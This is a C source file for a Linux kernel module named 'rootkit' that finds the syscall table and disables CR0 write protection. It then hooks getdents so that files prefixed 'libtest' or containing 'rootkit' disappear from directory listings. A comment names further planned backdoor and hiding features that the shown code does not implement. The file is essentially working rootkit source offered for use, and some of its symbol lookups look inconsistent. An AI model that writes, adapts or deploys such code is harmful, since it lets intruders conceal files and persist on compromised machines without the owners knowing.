#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/version.h>
#include <asm/special_insns.h>
#include <asm/tlbflush.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("subut4i");
MODULE_DESCRIPTION("This is not a rootkit.");
MODULE_VERSION("0.1");

static unsigned long * syscall_table;
static int (*fixed_set_memory_rw)(unsigned long, int);
static int (*fixed_set_memory_ro)(unsigned long, int);

#define GETDENTS_SYSCALL_NUM 78
#define WR_PR (1u << 16)

#define HIDE_PREFIX     "libtest"
#define HIDE_PREFIX_SZ      (sizeof(HIDE_PREFIX) - 1)
#define MODULE_NAME     "rootkit"
#define MODULE_NAME_SZ  (sizeof(MODULE_NAME)-1)

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char        d_name[1];
 };

// function type for the getdents handler function
typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
// the original handler
sys_getdents_t sys_getdents_orig = NULL;


/* 
 * Hook an existing proc/dev file to give us a backdoor (give current user root)
 * Hide us from /proc/modules
 * Hide libtest from file system (getdent)
 * Hide libtest from /proc/<PID>/maps
 *
 */


asmlinkage long 
sys_getdents_new (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) 
{
	int boff;
	struct linux_dirent __user * ent;
	long ret = sys_getdents_orig(fd, dirent, count);
	char* dbuf;
	if (ret <= 0) {
		return ret;
	}
	dbuf = (char*)dirent;
	// go through the entries, looking for one that has our prefix
	for (boff = 0; boff < ret;) {
		ent = (struct linux_dirent*)(dbuf + boff);

		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) // if it has the hide prefix
				|| (strstr(ent->d_name, MODULE_NAME) != NULL)) {     // or if it has the module name anywhere in it
			// remove this entry by copying everything after it forward
			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
			// and adjust the length reported
			ret -= ent->d_reclen;
		} else {
			// on to the next entry
			boff += ent->d_reclen;
		}
	}
	return ret;
}


static unsigned long * 
find_syscall_table (void)
{

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
    unsigned long ret = kallsyms_lookup_name("syscall_table");
    printk("Found syscall table at %p\n", (void*)ret);
    return (unsigned long*)ret;
#else 
    unsigned long ptr;
    unsigned long *p;
    for (ptr = (unsigned long) sys_close;
            ptr < (unsigned long) &loops_per_jiffy;
            ptr += sizeof(void*)) {
        p = (unsigned long *)ptr;
        if (p[__NR_close] == (unsigned long) sys_close) {
            printk("found syscall table");
            return (unsigned long*)p;
        }
    }
    printk("syscall table not found");
    return NULL;
#endif
}

static int
init_syscall_table (void)
{
    syscall_table = (unsigned long*)find_syscall_table();
    fixed_set_memory_rw = (void*)kallsyms_lookup_name("set_memory_rw");

    if (!fixed_set_memory_rw) {
        printk(KERN_INFO "Unable to find set_memory_rw\n");
    }

    fixed_set_memory_ro = (void*)kallsyms_lookup_name("set_memory_ro");
    if (!fixed_set_memory_ro) {
        printk(KERN_INFO "Unable to find set_memory_ro\n");
    }

    printk(KERN_INFO "syscall init done\n");

    return 0;
}

static __init int
rootkit_init (void)
{
    int ret;

    init_syscall_table();

    printk(KERN_INFO "sys_call_table @ %p\n", syscall_table);
	
	// record the original getdents handler
	sys_getdents_orig = (sys_getdents_t)((void**)syscall_table)[GETDENTS_SYSCALL_NUM];
	
	printk(KERN_INFO "original sys_getdents @ %p\n", sys_getdents_orig);

    write_cr0(read_cr0() & (~WR_PR));
    ret = fixed_set_memory_rw(PAGE_ALIGN((unsigned long)syscall_table) - PAGE_SIZE, 1);
    write_cr3(virt_to_phys(current->mm->pgd));
    __flush_tlb_all();

    if (ret) {
        printk(KERN_INFO "Unable to set memory rw\n");
    }

    
    syscall_table[GETDENTS_SYSCALL_NUM] = sys_getdents_new;

    write_cr0(read_cr0() | WR_PR);
    ret = fixed_set_memory_ro(PAGE_ALIGN((unsigned long)syscall_table) - PAGE_SIZE, 1);
    write_cr3(virt_to_phys(current->mm->pgd));
    __flush_tlb_all();
	
    return 0;
}


static __exit void
rootkit_deinit (void)
{
    int ret;
    write_cr0(read_cr0() & (~WR_PR));
    ret = fixed_set_memory_rw(PAGE_ALIGN((unsigned long)syscall_table) - PAGE_SIZE, 1);
    write_cr3(virt_to_phys(current->mm->pgd));
    __flush_tlb_all();

    syscall_table[GETDENTS_SYSCALL_NUM] = sys_getdents_orig;

    write_cr0(read_cr0() | WR_PR);
    ret = fixed_set_memory_ro(PAGE_ALIGN((unsigned long)syscall_table) - PAGE_SIZE, 1);
    write_cr3(virt_to_phys(current->mm->pgd));
    __flush_tlb_all();
}

module_init(rootkit_init);
module_exit(rootkit_deinit);
